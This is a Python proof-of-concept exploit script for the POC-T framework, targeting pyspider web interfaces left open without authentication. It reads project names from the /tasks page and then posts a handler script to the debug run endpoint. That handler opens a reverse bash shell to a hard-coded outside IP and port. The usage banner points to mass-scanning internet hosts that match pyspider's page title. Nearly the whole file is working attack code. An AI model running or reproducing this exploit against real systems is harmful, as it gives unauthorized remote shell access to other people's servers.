#!/usr/bin python
# -*- coding: utf-8 -*-

# author unc1e

import requests
#import regex as re
import  re
import sys


banner = '''
#########<python By unc1e>#########     
Usage:
	python POC-T.py -s "pyspider-unauth-gexp" -aZ "title="pyspider"&&country!="CN""

'''
print(banner)

TIMEOUT = 8

def getpName(xurl):
    '''获取pyspider的项目名
    IN: str http://172.110.7.173:5000/
    OUT: list 
    '''
    xurl = 'http://'+xurl+"/tasks" if '//' not in xurl else xurl+"/tasks"
    r = requests.get(xurl, timeout=TIMEOUT, verify=False)
    
    pat = r' target=_blank>(.+?)</a>'
    #print(r.text)
    res = re.findall(pat, r.text)
    #print(res)#
    return res
    
    
# 主函数
## 配置    
IP = '45.32.183.248'
PORT = 9999


headers = {"Content-Type": "application/x-www-form-urlencoded"}
data ={
'webdav_mode': 'false',
'script':  '''from pyspider.libs.base_handler import *
import socket
import os
import sys
import time
import subprocess

def test():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{}",{}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/bash","-i"])
    except:
        pass
####  
class Handler(BaseHandler):
    def on_start(self):
    
        test()
'''.format(IP,PORT),
'task':'''{
  "process": {
    "callback": "on_start"
  },
  "project": "pyspider_test",
  "taskid": "data:,on_start",
  "url": "data:,on_start"}
'''
}

def poc(target):
    ## 发送payload
        
    #获取参数
    #target = sys.argv[1] 

   
    name = ''
    target = 'http://'+target if '//' not in target else target

    try:
        # 获取项目名的第一个
        name = getpName(target)[0]
    
        url = target+"/debug/{}/run".format(name)
        
        r = requests.post(url=url,data=data,headers=headers,timeout=8, verify=False)
        #print(r.status_code)
        return target
        
    except:
        return False
    #print("已经发送payload, 请检查是否有shell弹回")






